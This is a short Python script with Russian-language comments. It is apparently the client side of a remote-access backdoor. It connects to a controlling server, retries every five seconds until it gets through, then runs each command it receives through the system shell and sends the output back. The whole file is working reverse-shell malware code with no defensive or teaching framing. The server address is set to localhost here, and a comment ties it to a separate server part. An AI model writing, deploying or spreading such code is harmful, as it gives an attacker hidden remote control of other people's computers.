import socket
import sys, os, io
import ctypes
import time
import subprocess as sp

server = ('127.0.0.1', 11719) # IP и порт тот же, что и в серверной части
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Функция будет выполнять команду в терминале/cmd.exe и возращать результат
def run_command(command):
    encoding = os.device_encoding(1) or ctypes.windll.kernel32.GetOEMCP()
    out = sp.Popen(command, stdout=sp.PIPE, shell=True)
    result = io.TextIOWrapper(out.stdout, encoding='cp866')

    return result.read()

# Function connect to server
def connect():
    try:
        sock.connect(server)
        return True
    except:
        return False

# Connecting to server
def while_connect():
    connecting = True

    while connecting:
        if connect():
            connecting = False
        else:
            time.sleep(5) # Подключение раз в 5 секунд, ахиренная оптимизация, отвечаю

while_connect() # Коннект к серверу

# Data exchange
while True:
    try:
        command = sock.recv(4096).decode() # Получаем сообщение, которое отправил сервер

        if command == "exit":
            break

        else:
            result = run_command(command) # Выполняем команду
            length = str(len(result)).zfill(16)
            sock.send((length + result).encode()) # Отправка результат
    except:
        try:
            sock.send("\nexcept")
        except:
            pass